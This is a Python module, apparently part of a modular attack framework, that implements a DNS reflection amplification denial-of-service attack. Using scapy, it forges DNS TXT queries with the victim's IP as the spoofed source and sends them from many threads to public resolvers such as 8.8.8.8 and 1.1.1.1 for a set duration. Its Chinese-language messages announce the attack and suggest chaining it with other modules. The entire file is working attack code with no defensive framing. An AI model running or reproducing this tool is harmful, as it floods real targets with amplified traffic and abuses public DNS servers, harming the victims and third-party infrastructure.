import os,sys
project_root = os.path.dirname(os.path.dirname(os.path.dirname(__file__)))
lib_path = os.path.join(project_root, "lib")
sys.path.insert(0, lib_path)
import random
import threading
import time
import threading
from scapy.all import IP, UDP, DNS, DNSQR, send
from colorama import Fore,init
init(autoreset=True)
import fcntl
def safe_print(msg):
    with open(sys.stdout.fileno(), 'wb', closefd=False) as fd:
        fcntl.flock(fd, fcntl.LOCK_EX)  # 加锁
        sys.stdout.write(msg + '\n')
        sys.stdout.flush()
        fcntl.flock(fd, fcntl.LOCK_UN)  # 解锁

class Module:
    def __init__(self):
        self.name = "DNS Reflection Amplification Attack"
        self.port = 443
        self.protocol = "udp"
        self.platform = "multi"
        self.use_msf = False
        self.reflectors = [
            "114.114.114.114",
            "223.6.6.6",
            "8.8.8.8",
            "1.1.1.1"
        ]
        self.query_domain = "www.baidu.com"   # 配置放大记录
        self.threads_per_reflector = 10
        self.duration = 30

    def exploit(self, target_ip=None, target_port=None, lhost=None, session=None):
        safe_print(f"{Fore.GREEN}[*] 开始对 {target_ip} 发动 DNS 反射放大攻击，持续 {self.duration} 秒...")
        stop_event = threading.Event()
        threads = []
        for reflector in self.reflectors:
            for _ in range(self.threads_per_reflector):
                t = threading.Thread(target=self._dns_amplify_worker,
                                     args=(target_ip, reflector, stop_event))
                t.start()
                threads.append(t)
        time.sleep(self.duration)
        stop_event.set()
        for t in threads:
            t.join()
        safe_print(f"{Fore.GREEN}[+] 反射攻击结束")
        return False, "反射攻击已执行，请结合其他模块进行后续利用"

    def _dns_amplify_worker(self, target_ip, reflector, stop_event):
        while not stop_event.is_set():
            pkt = IP(src=target_ip, dst=reflector) / UDP(sport=random.randint(1024, 65535), dport=53) / DNS(rd=1, qd=DNSQR(qname=self.query_domain, qtype="TXT"))
            send(pkt, verbose=0)
